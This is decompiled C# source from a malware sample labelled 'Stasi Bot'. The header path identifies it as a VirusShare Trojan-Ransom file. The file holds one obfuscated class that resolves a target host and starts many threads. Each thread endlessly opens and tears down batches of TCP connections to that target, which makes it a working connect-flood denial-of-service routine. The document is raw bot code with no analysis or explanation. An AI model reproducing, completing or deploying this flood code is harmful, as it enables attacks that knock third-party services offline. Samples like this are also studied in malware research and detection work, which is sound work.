// Decompiled with JetBrains decompiler
// Type: ?10?
// Assembly: Stasi Bot, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5CBE163B-B93A-4B20-A7D0-9D33961B8040
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan-Ransom.Win32.Blocker.hefc-d761814a3881cda5552583bb55f86ecca16438332641b4ca511b957946e6659b.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

internal class \u003F10\u003F
{
  private ThreadStart[] \u003F62\u003F;
  private Thread[] \u003F64\u003F;
  public string \u003F40\u003F;
  private IPEndPoint \u003F66\u003F;
  public bool \u003F63\u003F;
  public int \u003F77\u003F;
  public int \u003F59\u003F;
  private \u003F10\u003F.\u003F11\u003F[] \u003F70\u003F;
  public int \u003F65\u003F;

  public void \u003F37\u003F()
  {
    try
    {
      this.\u003F66\u003F = new IPEndPoint(Dns.GetHostEntry(this.\u003F40\u003F).AddressList[0], this.\u003F77\u003F);
    }
    catch
    {
      this.\u003F66\u003F = new IPEndPoint(IPAddress.Parse(this.\u003F40\u003F), this.\u003F77\u003F);
    }
    this.\u003F64\u003F = new Thread[this.\u003F65\u003F];
    this.\u003F62\u003F = new ThreadStart[this.\u003F65\u003F];
    this.\u003F70\u003F = new \u003F10\u003F.\u003F11\u003F[this.\u003F65\u003F];
    for (int index = 0; index < this.\u003F65\u003F; ++index)
    {
      this.\u003F70\u003F[index] = new \u003F10\u003F.\u003F11\u003F(this.\u003F66\u003F, this.\u003F59\u003F);
      this.\u003F62\u003F[index] = new ThreadStart(this.\u003F70\u003F[index].\u003F17\u003F);
      this.\u003F64\u003F[index] = new Thread(this.\u003F62\u003F[index]);
      this.\u003F64\u003F[index].Start();
    }
    this.\u003F63\u003F = true;
  }

  public void \u003F38\u003F()
  {
    for (int index = 0; index < this.\u003F65\u003F; ++index)
    {
      try
      {
        this.\u003F64\u003F[index].Abort();
        this.\u003F64\u003F[index] = (Thread) null;
        this.\u003F62\u003F[index] = (ThreadStart) null;
        this.\u003F70\u003F[index] = (\u003F10\u003F.\u003F11\u003F) null;
      }
      catch
      {
      }
    }
    this.\u003F63\u003F = false;
  }

  private class \u003F11\u003F
  {
    private IPEndPoint \u003F66\u003F;
    private Socket[] \u003F67\u003F;
    private int \u003F61\u003F;

    public \u003F11\u003F(IPEndPoint _param1, int _param2)
    {
      this.\u003F66\u003F = _param1;
      this.\u003F61\u003F = _param2;
    }

    public void \u003F39\u003F(IAsyncResult _param1)
    {
    }

    public void \u003F17\u003F()
    {
label_0:
      try
      {
        while (true)
        {
          this.\u003F67\u003F = new Socket[this.\u003F61\u003F];
          for (int index = 0; index < this.\u003F61\u003F; ++index)
          {
            this.\u003F67\u003F[index] = new Socket(this.\u003F66\u003F.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            this.\u003F67\u003F[index].Blocking = false;
            AsyncCallback callback = new AsyncCallback(this.\u003F39\u003F);
            this.\u003F67\u003F[index].BeginConnect((EndPoint) this.\u003F66\u003F, callback, (object) this.\u003F67\u003F[index]);
          }
          Thread.Sleep(200);
          for (int index = 0; index < this.\u003F61\u003F; ++index)
          {
            if (this.\u003F67\u003F[index].Connected)
              this.\u003F67\u003F[index].Disconnect(false);
            this.\u003F67\u003F[index].Close();
            this.\u003F67\u003F[index] = (Socket) null;
          }
          this.\u003F67\u003F = (Socket[]) null;
        }
      }
      catch
      {
        for (int index = 0; index < this.\u003F61\u003F; ++index)
        {
          try
          {
            if (this.\u003F67\u003F[index].Connected)
              this.\u003F67\u003F[index].Disconnect(false);
            this.\u003F67\u003F[index].Close();
            this.\u003F67\u003F[index] = (Socket) null;
          }
          catch
          {
          }
        }
        goto label_0;
      }
    }
  }
}
